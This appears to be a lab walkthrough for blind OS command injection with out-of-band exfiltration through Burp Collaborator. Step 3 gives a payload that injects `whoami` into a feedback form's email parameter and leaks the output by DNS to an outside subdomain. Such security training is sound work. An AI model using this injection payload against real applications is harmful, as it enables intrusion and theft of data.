1. Go to the Burp menu, and launch the Burp Collaborator client.

2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.

3. Capture the request POST /feedback/submit. Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated: email=||nslookup `whoami`.YOUR-SUBDOMAIN-HERE.burpcollaborator.net||

4. Go back to the Burp Collaborator client window, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.

5. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Burp Collaborator client. The full domain name that was looked up is shown in the Description tab for the interaction.

6. To complete the lab, enter the name of the current user.